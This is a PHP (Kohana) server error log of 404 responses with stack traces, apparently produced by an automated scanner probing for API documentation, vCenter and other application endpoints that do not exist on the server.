2025-10-29 19:27:29 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:29 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:29 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL api-reference was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:29 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL doc was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:29 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL doc was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:29 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL idm/v2/api-docs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:29 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api/swagger/swagger-ui.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:29 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api/swagger/swagger-ui.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:29 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL swaggerui was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:29 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL swaggerui was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:29 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL reference was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:29 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL reference was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:29 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL swagger/ui/index was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:29 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL swagger/ui/index was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:29 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL api-reference was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:29 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL api/swagger-ui/api-docs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-29 19:27:29 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL api/spec was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-29 19:27:29 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL api/swagger-ui/api-docs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:29 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL api/spec was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:29 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL api/auth/cognito/callback was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-29 19:27:29 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL api/auth/cognito/callback was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:29 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL api/docs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-29 19:27:29 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL api/docs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:29 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL api/api-docs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-29 19:27:29 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL api/api-docs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:29 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL api/apidocs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-29 19:27:29 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL api/apidocs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:29 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL pp404 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:29 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL pp404 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:29 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL api/swagger-resources was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-29 19:27:29 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL api/swagger-resources was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:29 --- ERROR: ErrorException [ 8 ]: Undefined offset: 1 ~ APPPATH/classes/controller/api.php [ 67 ]
2025-10-29 19:27:29 --- STRACE: ErrorException [ 8 ]: Undefined offset: 1 ~ APPPATH/classes/controller/api.php [ 67 ]
--
#0 /var/www/html/application/classes/controller/api.php(67): Kohana_Core::error_handler(8, 'Undefined offse...', '/var/www/html/a...', 67, Array)
#1 [internal function]: Controller_Api->action_index()
#2 /var/www/html/system/classes/kohana/request/client/internal.php(118): ReflectionMethod->invoke(Object(Controller_Api))
#3 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#4 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#5 /var/www/html/index.php(115): Kohana_Request->execute()
#6 {main}
2025-10-29 19:27:29 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL api/__swagger__ was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-29 19:27:29 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL api/__swagger__ was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:29 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL api/swagger-resources/restservices/v2/api-docs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-29 19:27:29 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL api/swagger-resources/restservices/v2/api-docs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:29 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL api/_swagger_ was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-29 19:27:29 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL api/_swagger_ was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:29 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL api/swagger was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-29 19:27:29 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL api/swagger was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:29 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL swagger-ui was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:29 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL swagger-ui was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:29 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL api/swagger/ui/index was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-29 19:27:29 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL api/swagger/ui/index was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:29 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL api/v2/doc was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-29 19:27:29 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL api/v2/doc was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:29 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL api/v1 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-29 19:27:29 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL api/v1 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:29 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL classicapi/doc was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:29 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL classicapi/doc was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:29 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL api/help was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-29 19:27:29 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL api/help was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:29 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL swagger-resources/restservices/v2/api-docs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:29 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL swagger-resources/restservices/v2/api-docs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:29 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL api/v1/ui was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-29 19:27:29 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL api/v1/ui was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:29 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL api/v1/openapi was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-29 19:27:29 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL api/v1/openapi was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:29 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL auth/cognito/callback was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:29 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL auth/cognito/callback was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:29 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL _fragment was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:29 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL _fragment was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:29 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL _swagger_ was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:29 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL _swagger_ was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:29 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL api/v1/doc was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-29 19:27:29 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL api/v1/doc was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:30 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL app/rest/users/acxtest/RPC2 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:30 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL app/rest/users/acxtest/RPC2 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:30 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:30 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:30 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL eam/vib was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:30 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL eam/vib was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:30 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL ui/vcav-bootstrap/rest/vcav-providers/provider-logo was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:30 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL ui/vcav-bootstrap/rest/vcav-providers/provider-logo was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:30 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL ui/vcav-bootstrap/rest/vcav-providers/provider-logo was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:30 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL ui/vcav-bootstrap/rest/vcav-providers/provider-logo was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:30 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL eam/vibd was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:30 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL eam/vibd was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:30 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL casa/nodes/thumbprints was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:30 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL casa/nodes/thumbprints was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:30 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL ui/vropspluginui/rest/services/getstatus was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:30 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL ui/vropspluginui/rest/services/getstatus was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:30 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL catalog-portal/ui/oauth/verify was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:30 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL catalog-portal/ui/oauth/verify was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:31 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL axis2/services/listServices was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:31 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL axis2/services/listServices was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:31 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL console/j_security_check was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:31 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL console/j_security_check was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:31 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: roller-ui/login.rol ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:31 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: roller-ui/login.rol ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:31 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL dswsbobje/services/listServices was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:31 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL dswsbobje/services/listServices was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:31 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: Account/Register.aspx ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:31 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: Account/Register.aspx ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
